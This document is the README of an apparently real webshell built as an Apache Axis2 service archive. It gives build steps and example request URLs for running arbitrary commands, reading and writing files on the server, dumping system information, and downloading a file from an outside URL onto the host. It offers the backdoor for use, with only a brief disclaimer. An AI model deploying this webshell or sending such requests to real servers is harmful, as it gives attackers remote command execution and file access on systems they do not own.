# Introduction

A minimal webshell for Apache AXIS2

# Legal disclaimer

Using this tool is legit but hacking may not be. The author does not take any responsibility for such activities.

# Build instructions

Modify `$JAVA_HOME` variable if necessary (e.g to be compatible with JDK 1.6 series)

Then run `ant -v` to build it, you can find the compiled archive in `build` directory, aka `build/AxisInvoker.aar`

# Supported commands?

- exec  - Run a command, works on both Linux/Windows, no worries.   

  http://192.168.56.103:8080/axis2/services/AxisInvoker/exec?cmd=dir%20C:
   
   
- write - Write a file

   http://192.168.56.103:8080/axis2/services/AxisInvoker/write?path=c:\1.1txt&content=123
   

- info  - Display certain information, modify as needed

  http://192.168.56.103:8080/axis2/services/AxisInvoker/info
  

- read  - Read contents of a file

  http://192.168.56.103:8080/axis2/services/AxisInvoker/read?path=c:\boot.ini
  

- download - Download a file and save it somewhere

  http://192.168.56.103:8080/axis2/services/AxisInvoker/download?url=http://www.baidu.com&file=c:\122.txt
  


